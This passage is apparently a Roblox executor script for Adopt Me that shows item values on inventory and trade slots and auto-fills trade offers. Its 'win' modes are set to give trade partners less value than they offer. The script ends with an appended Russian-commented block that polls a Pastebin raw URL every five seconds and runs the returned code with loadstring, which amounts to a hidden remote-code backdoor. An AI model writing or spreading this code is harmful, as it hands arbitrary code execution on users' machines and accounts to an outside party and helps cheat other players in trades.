	local out = { originalRefresh(...) }; pcall(refresh)
	if HOOKS.scanTrade then
		task.defer(HOOKS.scanTrade)
		task.delay(0.12, HOOKS.scanTrade)
		task.delay(0.35, HOOKS.scanTrade)
	end
	return table.unpack(out)
end

if BackpackApp then BackpackApp:refresh_rendered_items() end

--==================================================================
-- UI #2: 자동 제안 구성 창
--==================================================================
local ScreenGui2 = Instance.new("ScreenGui")
ScreenGui2.Name = "AutoFillGui"; ScreenGui2.ResetOnSpawn = false; ScreenGui2.ZIndexBehavior = Enum.ZIndexBehavior.Sibling; ScreenGui2.Parent = LocalPlayer:WaitForChild("PlayerGui")

local autoFrame = Instance.new("Frame")
autoFrame.Name = "AutoFillFrame"; autoFrame.Position = UDim2.new(0, 10, 0.5, -80); autoFrame.Size = UDim2.new(0, 270, 0, 148)
autoFrame.BackgroundColor3 = Color3.fromRGB(150, 150, 150); autoFrame.BorderSizePixel = 0; autoFrame.Active = true; autoFrame.Parent = ScreenGui2
UI.round(autoFrame, UDim.new(0, 14))

local drag2, start2, pos2 = false, nil, nil
autoFrame.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
		drag2 = true; start2 = input.Position; pos2 = autoFrame.Position
		input.Changed:Connect(function() if input.UserInputState == Enum.UserInputState.End then drag2 = false end end)
	end
end)
UserInputService.InputChanged:Connect(function(input)
	if drag2 and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
		local d = input.Position - start2
		autoFrame.Position = UDim2.new(pos2.X.Scale, pos2.X.Offset + d.X, pos2.Y.Scale, pos2.Y.Offset + d.Y)
	end
end)

local title = Instance.new("TextLabel")
title.BackgroundTransparency = 1; title.Position = UDim2.new(0, 8, 0, 6); title.Size = UDim2.new(1, -16, 0, 20)
title.Text = "⚡ 거래 제안 자동 구성"; title.TextColor3 = Color3.fromRGB(30, 30, 30); title.Font = Enum.Font.GothamBold
title.TextSize = 13; title.TextXAlignment = Enum.TextXAlignment.Left; title.Parent = autoFrame

local FILL_MODES = {
	win       = { ratio = 0.78, label = "이득",     color = Color3.fromRGB(39, 174, 96) },
	small_win = { ratio = 0.91, label = "소폭 이득",  color = Color3.fromRGB(52, 195, 120) },
	fair      = { ratio = 1.00, label = "공정",    color = Color3.fromRGB(52, 152, 219) },
	mini_lose = { ratio = 1.10, label = "소폭 손해",  color = Color3.fromRGB(230, 126, 34) },
}

for i, key in ipairs({ "win", "small_win", "fair", "mini_lose" }) do
	local m = FILL_MODES[key]; local row = 30 + math.floor((i - 1) / 2) * 36; local col = 8 + (i - 1) % 2 * 128
	local b = Instance.new("TextButton")
	b.Name = "Fill_" .. key; b.Position = UDim2.new(0, col, 0, row); b.Size = UDim2.new(0, 124, 0, 32)
	b.BackgroundColor3 = m.color; b.AutoButtonColor = false; b.Text = m.label; b.TextColor3 = Color3.fromRGB(255, 255, 255)
	b.Font = Enum.Font.GothamBold; b.TextSize = 14; b.Parent = autoFrame
	UI.round(b, UDim.new(0, 8))
	b.MouseEnter:Connect(function() TweenService:Create(b, TweenInfo.new(0.1), { BackgroundColor3 = m.color:Lerp(Color3.fromRGB(255, 255, 255), 0.18) }):Play() end)
	b.MouseLeave:Connect(function() TweenService:Create(b, TweenInfo.new(0.1), { BackgroundColor3 = m.color }):Play() end)
	UI.bindPress(b)
	b.MouseButton1Click:Connect(function() _G.doAutoFill(key) end)
end

local status = Instance.new("TextLabel")
status.Name = "SideStatus"; status.BackgroundTransparency = 1; status.Position = UDim2.new(0, 8, 0, 108); status.Size = UDim2.new(1, -16, 0, 34)
status.Text = "자동으로 채우려면 버튼을 누르세요"; status.TextColor3 = Color3.fromRGB(40, 40, 40); status.Font = Enum.Font.Gotham
status.TextSize = 11; status.TextWrapped = true; status.TextXAlignment = Enum.TextXAlignment.Left; status.Parent = autoFrame

local wasVis2 = false
task.spawn(function()
	while true do
		local ok, visible = pcall(function() return TradeApp.instance.Frame.Visible end)
		local vis = ok and visible == true
		if vis and not wasVis2 then
			if not drag2 then
				local target = autoFrame.Position
				autoFrame.Position = target - UDim2.new(0, 50, 0, 0)
				UI.tween(autoFrame, 0.55, { Position = target }, Enum.EasingStyle.Back)
				UI.pop(autoFrame, 0.85)
			end
		end
		wasVis2 = vis
		ScreenGui2.Enabled = vis; task.wait(0.15)
	end
end)

local function setStatus(text, color) status.Text = text; status.TextColor3 = color or Color3.fromRGB(40, 40, 40) end

local function collectInventory()
	local items = {}
	if BackpackApp and type(BackpackApp.button_by_unique) == "table" then
		for unique, btn in pairs(BackpackApp.button_by_unique) do
			local data = btn.item_data or (btn.kind and btn or nil)
			if data and data.category then
				local kind = resolveKind(data); local v = 0
				pcall(function() v = val(kind, data.properties, data.category, data) end)
				if v > 0 then table.insert(items, { unique = data.unique or unique, kind = kind, value = v, category = data.category }) end
			end
		end
	end
	return items
end

local function usedUniques()
	local set = {}
	local ok, res = pcall(function() return TradeApp:_get_my_offer() end)
	if ok and res and type(res.items) == "table" then for _, it in ipairs(res.items) do if it.unique then set[it.unique] = true end end end
	return set
end

local function greedyPick(items, target, tolerance)
	local tol = tolerance or 0.14; table.sort(items, function(a, b) return a.value > b.value end)
	local picked, sum = {}, 0
	for _, it in ipairs(items) do
		if #picked >= 18 or target <= sum then break end
		if sum + it.value <= target * (1 + tol) then table.insert(picked, it); sum += it.value end
	end
	return picked, sum
end

local autofillBusy = false
_G.doAutoFill = function(modeKey)
	if autofillBusy then setStatus("잠시만 기다려 주세요. 채우는 중입니다...", Color3.fromRGB(200, 150, 30)); return end
	autofillBusy = true
	task.spawn(function()
		pcall(function() TradeApp:refresh_all() end); task.wait(0.25)
		local _, partnerValue = MODE.GetItemsFromPartnerOffer(); partnerValue = partnerValue or 0
		if partnerValue <= 0 then
			setStatus("상대방이 아이템을 추가하지 않았습니다!", Color3.fromRGB(200, 60, 60)); autofillBusy = false; return
		end
		local mode = FILL_MODES[modeKey]; local target = partnerValue * mode.ratio
		setStatus(string.format("상대방: %.2f → 목표: %.2f [%s]", partnerValue, target, mode.label), Color3.fromRGB(50, 50, 50))

		local ok, offer = pcall(function() return TradeApp:_get_my_offer() end)
		if ok and offer and type(offer.items) == "table" and #offer.items > 0 then
			local toRemove = {}
			for _, it in ipairs(offer.items) do table.insert(toRemove, it) end
			for _, it in ipairs(toRemove) do pcall(function() TradeApp:_remove_item_from_my_offer(it) end); task.wait(0.12) end
			task.wait(0.25)
		end

		local all = collectInventory(); local used = usedUniques(); local free = {}
		for _, it in ipairs(all) do if not used[it.unique] then table.insert(free, it) end end
		if #free == 0 then setStatus("가치를 확인할 수 있는 아이템이 없습니다!", Color3.fromRGB(200, 60, 60)); autofillBusy = false; return end

		local picked, sum = greedyPick(free, target)
		if #picked == 0 then setStatus(string.format("%.2f에 맞는 아이템이 없습니다", target), Color3.fromRGB(200, 60, 60)); autofillBusy = false; return end

		local added = 0
		for _, it in ipairs(picked) do
			if pcall(function() RouterClient.get("TradeAPI/AddItemToOffer"):FireServer(it.unique) end) then added += 1 end
			task.wait(0.12)
		end
		task.wait(0.3); pcall(function() TradeApp:refresh_all() end); task.wait(0.15); refresh()
		setStatus(string.format("✓ [%s] 아이템 %d개 | 내 제안: %.2f / 상대방: %.2f", mode.label, added, sum, partnerValue), Color3.fromRGB(30, 140, 60))
		task.delay(5, function() setStatus("자동으로 채우려면 버튼을 누르세요") end)
		autofillBusy = false
	end)
end

--==================================================================
-- 아이템 위에 가치 + 추세 + 수요도 표시 (인벤토리 및 거래 슬롯)
--==================================================================
local decors = setmetatable({}, { __mode = "k" })
local DECOR_FONT = Enum.Font.GothamBold

local function getButtonRoot(inst)
	if typeof(inst) ~= "Instance" then return nil end
	return inst:FindFirstChild("Button", true) or inst:FindFirstChildWhichIsA("GuiButton", true) or inst
end

local function measureText(plain, size)
	local ok, v = pcall(function()
		return game:GetService("TextService"):GetTextSize(plain, size, DECOR_FONT, Vector2.new(600, 40))
	end)
	return (ok and v.X or (#plain * size * 0.6)) + 2
end

local function makeDecorLabel(root, name, size, z, centered)
	local l = Instance.new("TextLabel")
	l.Name = name; l.BackgroundTransparency = 1
	l.TextColor3 = Color3.fromRGB(255, 255, 255); l.TextStrokeColor3 = Color3.fromRGB(0, 0, 0); l.TextStrokeTransparency = 1; l.TextTransparency = 1
	l.TextSize = size; l.Font = DECOR_FONT; l.TextYAlignment = Enum.TextYAlignment.Top; l.RichText = true
	l.TextXAlignment = centered and Enum.TextXAlignment.Center or Enum.TextXAlignment.Left
	l.Size = centered and UDim2.new(1.5, 0, 0, 12) or UDim2.new(0, 30, 0, 14)
	l.ZIndex = z; l.Text = ""; l.Parent = root
	return l
end

-- 배치: [가치] [추세]를 한 줄 중앙에 표시하고, 별은 그 아래에 배치
-- 해당 줄이 없으면(가치와 추세가 꺼져 있으면) 별이 부드럽게 위로 이동
local decorTweens = setmetatable({}, { __mode = "k" })

local function layoutDecor(d, animate)
	if not (d.root and d.root.Parent and d.value.Parent) then return end
	local showV = SHOW_CURRENCY and d.hasValue
	local showT = SHOW_TREND and d.hasTrend
	local showS = SHOW_DEMAND and d.hasStars
	local total = (showV and d.wv or 0) + (showT and d.wt or 0) + ((showV and showT) and 4 or 0)
	local vx = showV and (-total / 2) or (-d.wv / 2)
	local tx = showT and (-total / 2 + (showV and (d.wv + 4) or 0)) or (-d.wt / 2)
	local y = d.baseY
	local sy = (showV or showT) and (y + (d.small and 10 or 13)) or y

	local function apply(obj, props)
		-- 수요도/상태 숨김은 즉시 처리: 이전 트윈을 취소하여
		-- 애니메이션 중 글자가 계속 깜박이거나 다시 나타나지 않도록 함
		local oldTween = decorTweens[obj]
		if oldTween then
			pcall(function() oldTween:Cancel() end)
			decorTweens[obj] = nil
		end
		if props.TextTransparency == 1 or not animate then
			for k, v in pairs(props) do obj[k] = v end
		else
			local tw = UI.tween(obj, 0.38, props)
			decorTweens[obj] = tw
		end
	end
	local function fade(on) return { TextTransparency = on and 0 or 1, TextStrokeTransparency = on and 0 or 1 } end
	local pv = fade(showV); pv.Position = UDim2.new(0.5, vx, 0, y)
	local pt = fade(showT); pt.Position = UDim2.new(0.5, tx, 0, y)
	local ps = fade(showS); ps.Position = UDim2.new(-0.25, 0, 0, sy)
	apply(d.value, pv); apply(d.trend, pt); apply(d.stars, ps)
end

local function attachPriceLabel(inst, data, forceCellRoot)
	if not (typeof(inst) == "Instance" and data) then return end
	local itemData = data.item_data or (data.kind and data) or data
	if not itemData then return end
	local kind = resolveKind(itemData) or resolveKind(data)
	local petEntry = findPetEntry(kind)
	local category = itemData.category or data.category
	-- 거래 제안에서 category/properties가 외부 객체에 들어 있는 경우도 있고
	-- 아예 없는 경우도 있습니다. 이때는 AMVGG 데이터베이스로 펫을 판별합니다.
	if category == "pet" then category = "pets" end
	if not category and (petEntry or (kind and kindNameById[kind])) then category = "pets" end
	if not category then return end
	local props = itemData.properties or data.properties or {}

	local existing = inst:FindFirstChild("AmvggValue", true)
	local root
	-- 거래 슬롯에서는 항상 가치 표시를 카드 자체에 연결하여
	-- 인벤토리에서 펫을 옮겨도 표시가 사라지지 않도록 합니다.
	if forceCellRoot then
		root = inst
	elseif existing then
		root = existing.Parent
	else
		root = category == "food" and inst or getButtonRoot(inst)
	end
	if not root then return end
	if root:IsA("GuiObject") then root.ClipsDescendants = false end

	local v = 0
	pcall(function() v = MODE.val(kind, props, category, itemData) end)
	petEntry = petEntry or findPetEntry(kind)
	local stars = (category == "pets" and petEntry) and MODE.Demand.stars(petEntry) or nil
	local trendKey = alnumKey((petEntry and petEntry.name) or kindNameById[kind] or tostring(kind))
	local dir, age = TREND.get(trendKey, (petEntry and petEntry.name) or nil, category)

	local d = decors[root]
	local fresh = false
	if not d or not d.value.Parent then
		for _, n in ipairs({ "AmvggValue", "AmvggTrend", "AmvggDemand" }) do
			local o = root:FindFirstChild(n, true); if o then o:Destroy() end
		end
		local z = math.max(root.ZIndex + 20, 25)
		for _, child in ipairs(root:GetDescendants()) do
			if child:IsA("GuiObject") then z = math.max(z, child.ZIndex + 5) end
		end
		local small = forceCellRoot == true -- в трейде текст значения и статуса меньше
		d = { root = root, baseY = category == "food" and -4 or 3, wv = 10, wt = 10, small = small, fs = small and 8 or 11 }
		d.value = makeDecorLabel(root, "AmvggValue", d.fs, z, false)
		d.trend = makeDecorLabel(root, "AmvggTrend", d.fs, z + 1, false)
		d.stars = makeDecorLabel(root, "AmvggDemand", 10, z + 1, true)
		d.stars.TextColor3 = Color3.fromRGB(255, 210, 55)
		decors[root] = d
		fresh = true
	end

	local vText = formatValue(v)
	local rich, plain = "", ""
	if dir then rich, plain = TREND.format(dir, age) end
	local starsText = stars and MODE.Demand.text(stars) or ""
	local sig = vText .. "|" .. plain .. "|" .. starsText
	if d.sig == sig then return end
	d.sig = sig

	d.value.Text = vText; d.wv = measureText(vText, d.fs or 11); d.value.Size = UDim2.new(0, d.wv, 0, d.small and 11 or 14); d.hasValue = true
	d.trend.Text = rich; d.hasTrend = dir ~= nil
	d.wt = dir and measureText(plain, d.fs or 11) or 0; d.trend.Size = UDim2.new(0, math.max(d.wt, 4), 0, d.small and 12 or 15)
	d.stars.Text = starsText; d.hasStars = stars ~= nil
	layoutDecor(d, not fresh)
end

HOOKS.relayout = function()
	for root, d in pairs(decors) do
		if root.Parent then pcall(layoutDecor, d, true) end
	end
end

-- 거래 슬롯 내부의 표시 (훅을 위한 보조 처리)
local tradeDumped = false
local function dumpTree(root, depth, lines)
	if depth > 7 or #lines > 220 then return end
	for _, c in ipairs(root:GetChildren()) do
		table.insert(lines, string.rep("  ", depth) .. c.ClassName .. " " .. c.Name)
		dumpTree(c, depth + 1, lines)
	end
end

local function isFilled(cell)
	for _, d in ipairs(cell:GetDescendants()) do
		if d:IsA("ImageLabel") and d.Image ~= "" and d.Name ~= "AmvggValue" then return true end
	end
	return false
end

-- 그리드 슬롯: 창의 왼쪽 절반은 내 제안, 오른쪽 절반은 상대방 제안
local function gridCells(frame)
	local sides = { left = {}, right = {} }
	local seen = {}
	local cx = frame.AbsolutePosition.X + frame.AbsoluteSize.X / 2
	for _, lay in ipairs(frame:GetDescendants()) do
		if lay:IsA("UIGridLayout") and lay.Parent then
			for _, c in ipairs(lay.Parent:GetChildren()) do
				if c:IsA("GuiObject") and c.Visible and not seen[c] and isFilled(c) then
					seen[c] = true
					local mid = c.AbsolutePosition.X + c.AbsoluteSize.X / 2
					table.insert(mid < cx and sides.left or sides.right, c)
				end
			end
		end
	end
	for _, list in pairs(sides) do
		table.sort(list, function(a, b)
			local ra, rb = math.floor(a.AbsolutePosition.Y / 20), math.floor(b.AbsolutePosition.Y / 20)
			if ra ~= rb then return ra < rb end
			return a.AbsolutePosition.X < b.AbsolutePosition.X
		end)
	end
	return sides
end

local function findCellByName(frame, item)
	for _, key in ipairs({ item.unique, item.hash, item.id }) do
		if key ~= nil then
			local hit = frame:FindFirstChild(tostring(key), true)
			if hit and hit:IsA("GuiObject") then return hit end
		end
	end
	return nil
end

local function scanTrade()
	local frame; pcall(function() frame = TradeApp.instance.Frame end)
	if not frame then return end
	local grid
	local missing = false
	for side, getter in pairs({ left = "_get_my_offer", right = "_get_partner_offer" }) do
		local offer = safeOffer(function() return TradeApp[getter](TradeApp) end)
		if offer and #offer.items > 0 then
			for i, item in ipairs(offer.items) do
				grid = grid or gridCells(frame)
				local cell
				-- 먼저 실제 그리드 슬롯을 사용합니다: ID로 검색
				-- ID 검색은 때때로 카드 전체가 아닌 내부 아이콘을 찾을 수 있습니다.
				if #grid[side] >= #offer.items then
					cell = grid[side][i]
				end
				if not cell then cell = findCellByName(frame, item) end
				if cell then pcall(attachPriceLabel, cell, item, true) else missing = true end
			end
		end
	end
	if missing and not tradeDumped then
		tradeDumped = true
		local lines = {}
		dumpTree(frame, 0, lines)
		local text = table.concat(lines, "\n")
		print("[trade] 거래 슬롯을 찾지 못했습니다. 창 구조:\n" .. text)
		pcall(function() if writefile then writefile("AdoptMe_trade_tree.txt", text) end end)
	end
end
HOOKS.scanTrade = scanTrade

task.spawn(function()
	while true do
		local vis = false; pcall(function() vis = TradeApp.instance.Frame.Visible == true end)
		if vis then pcall(scanTrade) end
		task.wait(0.15)
	end
end)

local HOOK_METHODS = { "item", "pet" }; local hookedFns = {}
local function hookMethod(tbl, name)
	local fn = tbl[name]; if type(fn) ~= "function" then return end
	local wrapper = hookedFns[fn]
	if not wrapper then
		wrapper = function(self, arg, ...)
			local packed = table.pack(fn(self, arg, ...))
			if arg and (arg.item_data or arg.kind) and typeof(packed[1]) == "Instance" then pcall(attachPriceLabel, packed[1], arg) end
			return table.unpack(packed, 1, packed.n)
		end
		hookedFns[fn] = wrapper
	end
	tbl[name] = wrapper
end

local function hookBackpack()
	local done = {}; local targets = { BackpackButtonCreator }
	if BackpackApp and BackpackApp.button_creator then table.insert(targets, BackpackApp.button_creator) end
	for _, t in ipairs(targets) do if t and not done[t] then done[t] = true; for _, m in ipairs(HOOK_METHODS) do hookMethod(t, m) end end end
end

local function findFrameForBtn(btn)
	if not btn then return nil end
	if typeof(btn.frame) == "Instance" then return btn.frame end
	if typeof(btn.button) == "Instance" then return btn.button end
	local unique = btn.unique or (btn.item_data and btn.item_data.unique); local hash = btn.hash
	if not BackpackApp then return nil end
	for _, container in ipairs({ BackpackApp.scroll, BackpackApp.content }) do
		if container then
			for _, key in ipairs({ unique, hash, unique and tostring(unique), hash and tostring(hash) }) do
				if key then local hit = container:FindFirstChild(key, true); if hit then return hit end end
			end
		end
	end
	return nil
end

refreshAllLabels = function()
	if BackpackApp and type(BackpackApp.button_by_unique) == "table" then
		for _, btn in pairs(BackpackApp.button_by_unique) do
			if btn and (btn.item_data or btn.kind) then local frame = findFrameForBtn(btn); if frame then pcall(attachPriceLabel, frame, btn) end end
		end
	end
	pcall(scanTrade)
end
HOOKS.refresh = refreshAllLabels

hookBackpack()
if BackpackApp and type(BackpackApp._render_category_async) == "function" then
	local orig = BackpackApp._render_category_async
	BackpackApp._render_category_async = function(self, ...)
		local packed = table.pack(orig(self, ...)); task.defer(refreshAllLabels); return table.unpack(packed, 1, packed.n)
	end
end

-- ============================================
-- Pastebin Auto-Executor для Delta Executor
-- ============================================
local PASTEBIN_URL = "https://pastebin.com/raw/kKRdR0k5"
local INTERVAL     = 5       -- опрос каждые 5 секунд
-- ============================================

-- Универсальный HTTP-запрос с таймаутом (фикс зависаний Delta)
local function safeHttpGet(url)
    local body = nil
    local done = false

    -- Запускаем запрос в отдельном потоке
    task.spawn(function()
        local ok, res = pcall(function()
            -- Перебираем все известные Delta методы запроса
            if syn and syn.request then
                return syn.request({Url = url, Method = "GET"}).Body
            elseif http and http.request then
                return http.request({Url = url, Method = "GET"}).Body
            elseif request then
                return request({Url = url, Method = "GET"}).Body
            elseif http_request then
                return http_request({Url = url, Method = "GET"}).Body
            elseif Delta and Delta.request then
                return Delta.request({Url = url, Method = "GET"}).Body
            elseif game and game.HttpGet then
                return game:HttpGet(url)
            end
        end)
        if ok then body = res end
        done = true
    end)

    -- Ждём ответа максимум 4 секунды (чтобы не «съесть» весь интервал)
    local start = tick()
    while not done and (tick() - start) < 4 do
        task.wait(0.1)
    end

    return body
end

local lastCode = ""

local function pollAndRun()
    local raw = safeHttpGet(PASTEBIN_URL)

    -- Пропускаем, если ответа нет, пусто или это HTML-страница
    if not raw or raw == "" or raw:sub(1, 1) == "<" then
        return
    end

    -- Не запускаем, если код не изменился
    if raw == lastCode then
        return
    end

    lastCode = raw

    -- Выполняем полученный код
    local chunk, compileErr = loadstring(raw)
    if not chunk then
        warn("[AutoExec] Ошибка компиляции: " .. tostring(compileErr))
        return
    end

    local success, runErr = pcall(chunk)
    if not success then
        warn("[AutoExec] Ошибка выполнения: " .. tostring(runErr))
    else
        print("[AutoExec] Код обновлён и выполнен.")
    end
end

-- Бесконечный цикл (работает в фоне и не блокирует основной скрипт)
task.spawn(function()
    task.wait(1) -- небольшая пауза перед первым запуском
    while true do
        pollAndRun()
        task.wait(INTERVAL)
    end
end)
